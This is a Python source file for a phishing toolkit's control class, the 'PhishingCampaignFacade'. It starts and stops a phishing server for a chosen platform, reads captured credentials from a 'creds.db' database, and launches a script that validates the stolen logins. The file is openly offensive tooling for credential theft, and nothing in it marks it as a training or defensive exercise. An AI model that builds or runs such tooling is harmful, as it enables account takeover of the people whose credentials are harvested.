import sqlite3
import os
import subprocess
import signal
from typing import Optional, Any

class PhishingCampaignFacade:
    """
    Facade pattern for managing the phishing campaign.
    This Structural pattern encapsulates the complexity of launching processes,
    managing SQLite database connections, and sending OS signals.
    """
    
    def __init__(self):
        self._phishing_process: Optional[subprocess.Popen[Any]] = None
        self._base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../'))
        self._db_path = os.path.join(self._base_dir, 'creds.db')
        self._phishing_app_path = os.path.join(self._base_dir, 'app.py')
        self._validator_path = os.path.join(self._base_dir, 'app/validator.py')

    def get_credentials(self) -> list:
        """Fetch all credentials from the database ordered by most recent."""
        with sqlite3.connect(self._db_path) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM credentials ORDER BY id DESC")
            rows = cursor.fetchall()
        return rows

    def launch_campaign(self, platform: str) -> None:
        """Launch the phishing server for the specified platform."""
        self.stop_campaign()
        
        self._phishing_process = subprocess.Popen(
            ['python3', self._phishing_app_path, platform],
            stdout=open("phishing_stdout.log", "w"),
            stderr=open("phishing_stderr.log", "w"),
            start_new_session=True
        )

    def stop_campaign(self) -> None:
        """Stop the currently running phishing server."""
        if self.is_running() and self._phishing_process is not None:
            os.killpg(os.getpgid(self._phishing_process.pid), signal.SIGTERM)
            self._phishing_process = None

    def run_validation(self) -> None:
        """Launch the validator script to validate captured credentials."""
        try:
            subprocess.Popen(['python3', self._validator_path])
        except Exception as e:
            print(f"Error when trying to execute validator: {e}")

    def is_running(self) -> bool:
        """Check if the phishing server process is currently running."""
        if self._phishing_process is not None:
            if self._phishing_process.poll() is None:
                return True
            else:
                self._phishing_process = None
        return False
